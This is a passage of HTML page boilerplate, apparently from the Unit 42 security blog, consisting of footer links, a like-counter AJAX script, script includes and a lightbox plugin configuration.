</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Legal Notices</h4><div class="menu-footer-legal-notices-phase-container"><ul id="menu-footer-legal-notices-phase" class="menu"><li id="menu-item-97093" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97093"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy</a></li>
<li id="menu-item-97094" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97094"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a></li>
<li id="menu-item-97095" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97095"><a target="_blank" href="https://www.paloaltonetworks.com/legal">Documents</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Account</h4><div class="menu-footer-trending-topics-phase-container"><ul id="menu-footer-trending-topics-phase" class="menu"><li id="menu-item-97102" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97102"><a href="https://start.paloaltonetworks.com/preference-center">Manage Subscriptions</a></li>
<li id="menu-item-97103" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97103"><a href="#">&nbsp;</a></li>
<li id="menu-item-97104" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97104"><a href="https://www.paloaltonetworks.com/security-disclosure">Report a Vulnerability</a></li>
</ul></div></div>              </div>
            </div>
          </div>

          
            <div class="copyrights py-25 mt-40">
               <p>© 2021 Palo Alto Networks, Inc. All rights reserved.</p>
            </div>
          
        </div>
      </div>
    </div>
  </div>
</footer>
    <script type="text/javascript">
	var isProcessing = false; 
    function alter_ul_post_values(obj,post_id,ul_type){
	
		if (isProcessing)    
		return;  
		isProcessing = true;   
		
		jQuery(obj).find("span").html("..");
                jQuery.ajax({
                    type: "POST",
                    url: "https://unit42.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php",
                    data: "post_id="+post_id+"&up_type="+ul_type,
                    success: function(msg){
                            jQuery(obj).find("span").html(msg);
                            isProcessing = false; 
                            jQuery(obj).find('svg').children('path').attr('stroke','#0050FF');
                            jQuery(obj).removeClass('idc_ul_cont_not_liked idc_ul_cont_not_liked_inner');
                    }
 		});
	}
	</script>
    <link rel='stylesheet' id='wpdevart_lightbox_front_end_css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/wpdevart_lightbox_front.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpdevart_lightbox_effects-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/effects_lightbox.css?ver=5.4.1' type='text/css' media='all' />
<script type='text/javascript' src='https://www.google.com/recaptcha/api.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/scripts/main.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/wp-embed.min.js?ver=5.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpdevart_lb_variables = {"eneble_lightbox_content":"enable","overlay_transparency_prancent":"80","enable_video_popuping":"enable","popup_background_color":"#000000","popup_loading_image":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/popup_loading.png","popup_initial_width":"350","popup_initial_height":"300","popup_youtube_width":"640","popup_youtube_height":"410","popup_vimeo_width":"500","popup_vimeo_height":"410","popup_max_width":"5000","popup_max_height":"5000","popup_position":"5","popup_fixed_position":"true","popup_outside_margin":"0","popup_border_width":"2","popup_border_color":"#000000","popup_border_radius":"10","control_buttons_show":"true","control_buttons_show_in_content":"false","control_buttons_height":"30","control_buttons_line_bg_color":"#000000","control_button_prev_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev.png","control_button_prev_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev_hover.png","control_button_next_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next.png","control_button_next_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next_hover.png","control_button_download_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download.png","control_button_download_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download_hover.png","control_button_innewwindow_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow.png","control_button_innewwindow_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow_hover.png","control_button_fullwidth_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth.png","control_button_fullwidht_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth_hover.png","control_button_fullwidthrest_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset.png","control_button_fullwidhtrest_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset_hover.png","control_button_close_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close.png","control_button_close_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close_hover.png","information_panel_show":"false","information_panel_show_in_content":"false","information_panel_bg_color":"#000000","information_panel_default_transparency":"100","information_panel_hover_trancparency":"100","information_panel_count_image_after_text":"Image","information_panel_count_image_middle_text":"of","information_panel_count_padding_left":"15","information_panel_count_padding_right":"4","information_panel_count_font_size":"20","information_panel_desc_padding_left":"15","information_panel_desc_padding_right":"4","information_panel_desc_font_size":"20","information_panel_desc_show_if_not":"true","information_panel_text_for_no_caption":"No Caption","information_panel_title_padding_left":"5","information_panel_title_padding_right":"5","information_panel_title_font_size":"15","information_panel_title_show_if_not":"true","information_panel_text_for_no_title":"No Title","information_panel_ordering":"{\"count\":[1,\"count\"],\"title\":[0,\"title\"],\"caption\":[0,\"caption\"]}"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/javascript/wpdevart_lightbox_front.js?ver=1.0'></script>
          
  </body>
</html>
